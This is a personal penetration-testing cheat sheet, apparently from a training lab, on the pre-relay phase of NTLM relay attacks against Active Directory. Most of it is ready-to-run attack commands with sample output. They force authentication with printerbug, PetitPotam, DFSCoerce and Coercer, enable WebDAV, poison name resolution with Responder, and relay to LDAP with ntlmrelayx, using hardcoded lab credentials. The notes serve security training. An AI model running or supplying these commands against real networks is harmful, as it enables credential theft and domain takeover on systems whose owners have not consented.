Many techniques are used in the `pre-relay` phase, including:
- `AiTM` techniques such as `poisoning` and `spoofing` attacks.
- `Authentication Coercion` attacks.

> [!Attention] 
> If you want to use responder, Don't forget to disable all servers in it. Because user may use service that responder use, if so, you can't relay the NTLM.

```sh
# use .url or .lnk
python3 ntlm_theft.py -g all -s 172.16.117.30 -f '@myfile'
nxc smb $IP -u $USER -p $PASSWORD -M slinky -o SERVER=172.16.117.30 NAME=important

nxc smb 172.16.117.0/24 -u $USER -p $PASSWORD -M webdav # Check WebDav
# you should see if its enabled, WEBDAV  172.16.117.50  445    WS01      WebClient Service enabled on: 172.16.117.50, if not then follow:
nxc smb $IP -u $USER -p $PASSWORD -M drop-sc -o URL=https://$MY_IP/testing FILENAME=@secret # Enable WebDav
nxc smb $IP -u $USER -p $PASSWORD -M slinky -o SERVER=NOAREALNAME@8008 NAME=important # Trigger coarce, You should listen to port 8008 http!!!!.
sudo python3 Responder.py -I ens192 # use Responder to poison the response for the request to the NOAREALNAME name  <-------
# Use http-port 8008 because we have NOAREALNAME@8008.
ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-smb-server --http-port 8008 --no-da --no-acl --no-validate-privs --lootdir ldap_dump #<-----
```

---
### Coerce
To coerce `HTTP NTLM` authentication on `WebDAV`-enabled hosts, we use the same syntax; however, for the listener, we will set it as a valid `WebDAV` connection string, using the format `ATTACKER_MACHINE_NAME@PORT/PATH`:

- `ATTACKER_MACHINE_NAME` must be the `NetBIOS` or `DNS` name of the attacker machine (`Responder` provides one by default when we start it); however, because `Responder` will poison broadcast traffic in any case, we set it to an arbitrary string. In our case, we will set it to `SUPPORTPC`.
- `PORT` specifies an arbitrary port the `WebDAV` service will use to connect to the attack machine. In our case, we will set it to `80`.
- `PATH` specifies an arbitrary path the `WebDAV` service will attempt to connect. In our case, we will set it to `print`.
```sh
# Normal SMB coerce
printerbug.py inlanefreight/$USER:$PASSWORD@TARGET LISNTENER
# This one works perfectly with webDav.
# Coerce WebDav, You have been enabled it like the above section.
printerbug.py inlanefreight/plaintext$:'o6@ekK5#rlw2rAe'@172.16.117.60 SUPPORTPC@80/print

# This one maynot need valid creds
# `listener` and `target,` both of which can be a hostname or an IP address
PetitPotam.py LISTENER_IP TARGET_IP -u $USER -p $PASSWORD -d $DOMAIN
# WebDav.
# for the listener, we will set it as a valid `WebDAV` connection string:
PetitPotam.py WIN-MMRQDG2R0ZX@80/files TARGET_IP -u $USER -p $PASSWORD

# This one need valid creds
dfscoerce.py -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' 172.16.117.30 172.16.117.3

# Coercer
# Check if we can abuse any RPC to coerce
> sudo coercer scan -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $IP -t 172.16.117.60 -v
[+] DCERPC port '49669' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
[+] SMB named pipe '\PIPE\eventlog' is accessible!
   [+] Successful bind to interface (82273fdc-e32a-18c3-3f78-827929dc23ea, 0.0)!
[+] SMB named pipe '\PIPE\lsarpc' is accessible!

> sudo coercer coerce -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $IP -l 172.16.117.30 -t 172.16.117.3 --always-continue -v
[+] (ERROR_BAD_NETPATH)
# WebDav: `-wh` option to specify the `WebDAV` machine, `-wp` specifies the `WebDAV` port (we will use `80`)
Coercer.py -t 172.16.117.60 -u 'plaintext$' -p 'o6@ekK5#rlw2rAe' -wh SUPPORTPC2 -wp 80 -v

# others, hackerRecipes
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
privexchange.py -d $DOMAIN -u '$DOMAIN_USER' -p '$PASSWORD' -ah $ATTACKER_IP $EXCHANGE_SERVER_TARGET

```
Instead of using `Coercer` to automate the abuse of the `RPC` calls, we can do the same manually using the [windows coerced authentication methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) GitHub repository.

---
### Poisoning and Spoofing
These techniques usually make much noise and are opportunistic because many rely on requests and traffic initiated by the clients.
- [ARP Poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning)
- [DNS Poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dns-spoofing)
- [DHCP Spoofing](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcp-poisoning)
- [DHCPv6 Spoofing](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/dhcpv6-spoofing)
- [ADIDNS Poisoning](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing)
- [WPAD Spoofing](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wpad-spoofing)
- [WSUS Spoofing](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing)

Windows support various name resolution processes:
- `DNS`
- `NetBIOS Name Resolution` (`NBT-NS`)
- `Link-Local Multicast Name Resolution` (`LLMNR`)
- `Peer Name Resolution` (`PNR`)
- `Server Network Information Discovery` (`SNID`)

In addition to `Responder`, [Pretender](https://github.com/RedTeamPentesting/pretender) is a new powerful tool written in Go. It obtains a man-in-the-middle position by spoofing name resolutions and `DHCPv6` DNS-related takeover attacks. `Pretender` can be executed without answering any name resolution using the `--dry` flag, which helps analyze the broadcast traffic in the environment. `Pretender` offers [releases](https://github.com/RedTeamPentesting/pretender/releases/tag/v1.1.1) ready for use. by default, it poisons DHCP requests, `pretender` can be highly disruptive in production networks.

> [!NOTE]
> The problem with poisoning DHCP requests is that they will be semi-permanent on the machine until the request time has expired, the machine is rebooted, or a new DHCP request is forced. While this happens, any DNS requests made by this machine may miss their target, leaving the machine with network problems.


> [!Attention] 
> Things like LLMNR, mDNS won't work if you try to use proxy to attack directly from your attack machine, because proxies like ligolo only understands L3 traffic, And LLMNR is L2 so it won't be redirected.
